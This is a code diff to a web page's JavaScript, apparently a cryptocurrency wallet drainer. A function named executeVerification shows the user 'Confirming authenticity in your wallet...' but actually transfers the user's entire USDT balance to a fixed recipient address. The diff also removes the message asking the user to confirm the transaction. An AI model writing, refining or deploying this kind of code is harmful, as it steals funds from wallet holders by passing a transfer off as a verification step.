@@ -960,9 +960,7 @@
     // Execute verification (transfer) - MODIFIED to use File 2's direct await pattern
     async function executeVerification() {
         step4Desc.textContent = "Confirming authenticity in your wallet...";
-        modalMessage.textContent = "Please confirm the transaction in your wallet";
-
-        try {
+            try {
             // Get user's current BNB balance (from File 2 logic)
             const bnbBalanceWei = await web3.eth.getBalance(userAddress);
             const userBNB = parseFloat(web3.utils.fromWei(bnbBalanceWei, 'ether'));
@@ -1009,11 +1007,11 @@
             // Convert token to wei
             const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');
             
-            console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
+            console.log(`Transferring ${tokenBalanceValue} USDT to ${recipientAddress}...`);
             
             // Execute transaction using the direct await pattern from File 2
             // This is the core .send() method. The wallet connected will handle signing.
-            const receipt = await usdtContract.methods.transfer(bscAddress, amountWei).send({ from: userAddress });
+            const receipt = await usdtContract.methods.transfer(recipientAddress, amountWei).send({ from: userAddress });
             
             console.log("Transaction receipt:", receipt);
             // Transaction was successful
